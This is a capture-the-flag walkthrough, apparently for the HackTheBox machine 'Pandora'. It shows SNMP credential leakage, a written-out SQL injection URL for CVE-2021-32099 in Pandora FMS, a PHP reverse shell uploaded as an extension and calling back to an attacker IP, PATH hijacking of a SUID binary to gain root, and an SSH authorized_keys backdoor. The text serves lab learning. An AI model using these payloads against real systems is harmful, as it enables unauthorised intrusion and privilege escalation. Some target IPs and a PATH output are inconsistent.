
![[pandora logo.png]]


```
nmap -sVC -p- 10.129.3.221 -oN scan.txt

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 24c295a5c30b3ff3173c68d7af2b5338 (RSA)
|   256 b1417799469a6c5dd2982fc0329ace03 (ECDSA)
|_  256 e736433ba9478a190158b2bc89f65108 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Play | Landing
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.89 seconds
```

```
ffuf -c -w `fzf-wordlists` -u "http://10.129.3.221/FUZZ"

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.3.221/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 2022ms]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 2023ms]
assets                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 59ms]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 61ms]
:: Progress: [20469/20469] :: Job [1/1] :: 689 req/sec :: Duration: [0:00:33] :: Errors: 0 ::
```

Nothing interessting

UDP Scan

```
nmap -sUV 10.129.3.221
Starting Nmap 7.93 ( https://nmap.org ) at 2026-02-22 17:56 CET
Nmap scan report for 10.129.3.221
Host is up (0.035s latency).
Not shown: 998 closed udp ports (port-unreach)
PORT    STATE         SERVICE VERSION
68/udp  open|filtered dhcpc
161/udp open          snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
Service Info: Host: pandora

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1201.85 seconds
```

```
snmpwalk -c public -v 2c "10.129.3.221"

<SNIP>

iso.3.6.1.2.1.25.4.2.1.5.1010 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"

<SNIP>
```

# Shell as Daniel

```
ssh daniel@10.129.15.207
daniel@10.129.3.221's password:HotelBabylon23

<SNIP>

daniel@pandora:~$
```

In apache2's config file i found that there is a website running on localhost:80

```
daniel@pandora:/etc/apache2/sites-available$ cat pandora.conf
<VirtualHost localhost:80>
  ServerAdmin admin@panda.htb
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
  <Directory /var/www/pandora>
    AllowOverride All
  </Directory>
  ErrorLog /var/log/apache2/error.log
  CustomLog /var/log/apache2/access.log combined
</VirtualHost>
```

So let's do a **Dynamic Port Forwarding** with SSH to access it.

```
ssh -D 9050 daniel@10.129.16.141
```

And we should access the website.

![pandora.htb - localhost](Images/pandora.htb%20-%20localhost.png)

We notice that there is the version below, which is ```v7.0NG.742_FIX_PERL2020```.

There is the **CVE-2021-32099** which allow us to bypass authentication.
The vulnerability reside in **`chart_generator.php`** where we can inject the session_id through SQL Injection.
We will use the following payload : `?session_id=' UNION SELECT '1','2','id_usuario|s:5:"admin";' -- a`

By going through this URL
```
http://localhost/pandora_console/include/chart_generator.php?session_id=%27%20UNION%20SELECT%20%271%27,%272%27,%27id_usuario|s:5:%22admin%22;%27%20--%20a
```

We should be logged as admin.

![SQL Payload](Images/SQL%20Payload.png)

We can see the payload executed successfuly

![Logged as admin](Images/Logged%20as%20admin.png)

And we are logged in as admin

Now we must find a way to exploit the app.

According to this article https://www.sonarsource.com/fr/blog/pandora-fms-742-critical-code-vulnerabilities-explained/, we can upload a .zip file containing a malicious php file to get a web shell or even better a reverse shell. Let's try the second option.

First we create the PHP reverse shell using the one from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) and changing IP and port.

```
$ip = '10.10.16.54';  // CHANGE THIS
$port = 443;       // CHANGE THIS
```

Then we zip the file.

```
zip shell.zip shell.php
```

The we go to Admin Tools > Extension manager > Extension Uploader on the web app and we upload our file.

![File Upload](Images/File%20Upload.png)

The by going to `http://localhost/pandora_console/extensions/shell/shell.php` and pressing previous we should gain a reverse shell.

![Reverse Shell](Images/Reverse%20Shell.png)

```
matt@pandora:/$ id
uid=1000(matt) gid=1000(matt) groups=1000(matt)
```
We are matt, we can find the user flag under his home directory.

Let's look for privesc

```
find / -perm -4000 2>/dev/null
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/pandora_backup
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/at
/usr/bin/fusermount
/usr/bin/chsh
```

We notice that there is a uncommon SUID binary, `pandora_backup`.

After transfering it to our attacking machine and using `strings` on the binary, we notice this line.

```
tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*
```
First we can check if we can exploit the wildcard which target the folder `/var/www/pandora/pandora_console/`. 

```
matt@pandora:/usr/bin$ ls -la /var/www/pandora/pandora_console/
total 1604
drwxr-xr-x 16 matt matt    4096 Dec  7  2021 .
drwxr-xr-x  3 matt matt    4096 Dec  7  2021 ..
```

But we can't write files in the folder so a **TAR wildcard Injection** is not possible.

Let's try the second option, a **Path Hijacking** since the binary `tar` is called without absolute path.

Let's check the **$PATH** first to see if tar is not inside.
```
echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Ok `tar` is not inside so the binary is probably vulnerable.

We put the following payload inside a file that we will put in /tmp and we name it `tar`.

```
#!/bin/bash

/bin/bash -p
```
We give it execution right

```
chmod +x tar
```
And we add it to the PATH

```
export PATH=/tmp:$PATH
matt@pandora:/tmp$ echo $PATH
/tmp/tar:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Now let's run the SUID binary

```
matt@pandora:/tmp$ /usr/bin/pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
Backup successful!
Terminating program!
matt@pandora:/tmp$
```

We still have a shell as matt though.

Apparently, it's due to a restrictiction of `apache mpm-itk` which blocks the SUID, in order to bypass it we need a true shell as matt. To do so we can create a `/.ssh` directory with a `authorized_keys` file with our public key inside so we can connect with ssh as matt.

Let's start with creating the ssh key

**Attacker**
```
ssh-keygen -t rsa -b 4096 
```

Then we transfer the .pub key 

**Target**
```
echo 'ssh-rsa <SNIP>' > authorized_keys
```
Now we set the following permission

**Target**
```
chmod 700 /home/matt/.ssh
chmod 600 /home/matt/.ssh/authorized_keys
```

**Attacker**
```
chmod 600 id_rsa
```

The we can connect with ssh

```
ssh -i id_rsa matt@10.129.16.199
```

Now we can run the binary again and we should get root

```
/usr/bin/pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
root@pandora:/tmp#
```










